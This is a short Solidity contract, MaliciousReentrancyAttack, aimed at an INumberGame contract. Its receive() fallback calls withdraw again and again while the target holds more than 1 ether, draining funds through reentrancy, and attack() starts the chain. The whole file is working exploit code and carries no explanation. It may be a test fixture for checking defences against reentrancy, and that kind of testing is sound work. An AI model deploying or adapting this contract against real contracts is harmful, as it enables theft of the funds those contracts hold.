
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./INumberGame.sol";

contract MaliciousReentrancyAttack {
    INumberGame public numberGame;
    uint16 public gameId;

    constructor(INumberGame _numberGame, uint16 _gameId) {
        numberGame = _numberGame;
        gameId = _gameId;
    }

    receive() external payable {
        if(address(numberGame).balance > 1 ether) {  // A simple condition to avoid infinite loop
            numberGame.withdraw(gameId);
        }
    }

    function attack() external payable {
        numberGame.withdraw(gameId);
    }
}
